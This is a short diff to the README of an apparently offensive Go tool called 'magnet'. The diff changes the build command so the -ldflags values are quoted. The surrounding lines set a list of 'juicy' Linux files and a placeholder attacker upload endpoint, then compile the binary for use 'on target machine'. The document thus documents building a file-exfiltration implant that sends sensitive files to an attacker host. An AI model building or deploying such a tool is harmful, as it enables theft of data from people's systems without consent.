@@ -18,7 +18,7 @@ So the compilation line looks like this:
 ```shell
 export FILES=$(cat samples/linux_juicy_files.txt)
 export ENDPOINT=http://[ATTACKER_UPLOAD_SITE]
-GOOS=linux GOARCH=amd64 go build -ldflags "-X main.FileList=$FILES -X main.Endpoint=$ENDPOINT" magnet.go
+GOOS=linux GOARCH=amd64 go build -ldflags "-X 'main.FileList=$FILES' -X 'main.Endpoint=$ENDPOINT'" magnet.go
 ```
 
 Then on target machine:
